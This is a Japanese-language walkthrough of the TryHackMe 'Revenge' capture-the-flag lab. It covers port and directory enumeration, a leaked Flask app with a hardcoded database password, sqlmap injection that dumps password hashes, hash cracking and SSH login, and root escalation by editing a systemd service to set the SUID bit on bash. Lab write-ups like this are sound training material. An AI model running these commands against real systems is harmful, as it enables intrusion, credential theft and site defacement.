# Revenge CTF

https://tryhackme.com/room/revenge

## Enumeration

```shell
TARGET=10.201.94.178
sudo bash -c "echo $TARGET   revenge.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

SSH, HTTP

### ディレクトリ列挙

dirsearch で app.pyを発見。

```sh
[04:46:23] 200 -    5KB - /admin
[04:46:40] 200 -    2KB - /app.py
[04:46:52] 200 -    7KB - /contact
[04:47:15] 200 -    5KB - /login
[04:47:32] 200 -    7KB - /products
[04:47:35] 200 -  258B  - /requirements.txt
[04:47:44] 301 -  194B  - /static  ->  http://revenge.thm/static/
[04:47:48] 200 -    5KB - /templates/index.html
```

## app.py

いくつかシークレットが出ている。

```python
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)


app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')
```

ユーザー入力を使用しているのは `/products/<product_id>` のみで、SQLi の脆弱性がある。

```python
# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)
```

## sqlmap

### テーブル名

```sh
sqlmap -u "http://revenge.thm/products/1*" -D duckyinc --tables --batch

Database: duckyinc
[3 tables]
+-------------+
| system_user |
| user        |
| product     |
+-------------+
```

### sytem_user

```sh
sqlmap -u "http://revenge.thm/products/1*" -D duckyinc -T system_user --columns --batch

Table: system_user
[4 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| _password | varchar(128) |
| email     | varchar(120) |
| id        | int(11)      |
| username  | varchar(64)  |
+-----------+--------------+
```

ダンプ

```sh
sqlmap -u "http://revenge.thm/products/1*" -D duckyinc -T system_user -C username,_password --dump --batch

Table: system_user
[3 entries]
+--------------+--------------------------------------------------------------+
| username     | _password                                                    |
+--------------+--------------------------------------------------------------+
| server-admin | $2a$08[REDACTED] |
| kmotley      | $2a$12[REDACTED] |
| dhughes      | $2a$12[REDACTED] |
+--------------+--------------------------------------------------------------+
```

server-admin のパスワードのみ、rockyou.txt でクラックできた。  
/admin, /login はダミーのためログインできなかったが、SSHで接続できた。

## server-admin

flag2 が見つかった。flag1 をどこかで見落としたと思われる。（→　userテーブルのクレジットカード番号に入っていた）

```sh
server-admin@duckyinc:~$ pwd
/home/server-admin

server-admin@duckyinc:~$ ls -al
total 44
drwxr-xr-x 5 server-admin server-admin 4096 Aug 12  2020 .
drwxr-xr-x 3 root         root         4096 Aug 10  2020 ..
lrwxrwxrwx 1 root         root            9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 server-admin server-admin  220 Aug 10  2020 .bash_logout
-rw-r--r-- 1 server-admin server-admin 3771 Aug 10  2020 .bashrc
drwx------ 2 server-admin server-admin 4096 Aug 10  2020 .cache
-rw-r----- 1 server-admin server-admin   18 Aug 10  2020 flag2.txt
drwx------ 3 server-admin server-admin 4096 Aug 10  2020 .gnupg
-rw------- 1 root         root           31 Aug 10  2020 .lesshst
drwxr-xr-x 3 server-admin server-admin 4096 Aug 10  2020 .local
-rw-r--r-- 1 server-admin server-admin  807 Aug 10  2020 .profile
-rw-r--r-- 1 server-admin server-admin    0 Aug 10  2020 .sudo_as_admin_successful
-rw------- 1 server-admin server-admin 2933 Aug 12  2020 .viminfo
```

duckyinc.service を一通り操作できる。

```sh
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

sudoedit を使って、サービス定義を書き換えた。

```sh
server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=www-data
WorkingDirectory=/var/www/duckyinc
#ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecStart=/bin/chmod +s /bin/bash
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

サービス再起動

```sh
server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
```

成功。

```sh
server-admin@duckyinc:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

昇格成功。flag3は・・・？

```sh
server-admin@duckyinc:~$ bash -p
bash-4.4# id
uid=1001(server-admin) gid=1001(server-admin) euid=0(root) egid=0(root) groups=0(root),33(www-data),1001(server-admin)

bash-4.4# ls -al /root
total 52
drwx------  7 root root 4096 Aug 28  2020 .
drwxr-xr-x 24 root root 4096 Aug  9  2020 ..
drwxr-xr-x  2 root root 4096 Aug 12  2020 .bash_completion.d
lrwxrwxrwx  1 root root    9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3227 Aug 12  2020 .bashrc
drwx------  3 root root 4096 Aug  9  2020 .cache
drwx------  3 root root 4096 Aug  9  2020 .gnupg
drwxr-xr-x  5 root root 4096 Aug 12  2020 .local
-rw-------  1 root root  485 Aug 10  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 10  2020 .selected_editor
drwx------  2 root root 4096 Aug  9  2020 .ssh
-rw-------  1 root root 7763 Aug 12  2020 .viminfo
```

任務はウェブページに侵入して改ざんすることなので、`/var/www/duckyinc/templates/index.html` を更新することで、flag3 が現れた。

## 振り返り

- dirsearch のおかげで一瞬で app.py が見つかったが、それが無ければかなりハマった可能性がある。
- REST API に対して sqlmap を使うパターンは初めて。
- 最後の、改ざんしたらフラグが出てくるというのはストーリー性があって面白かった。
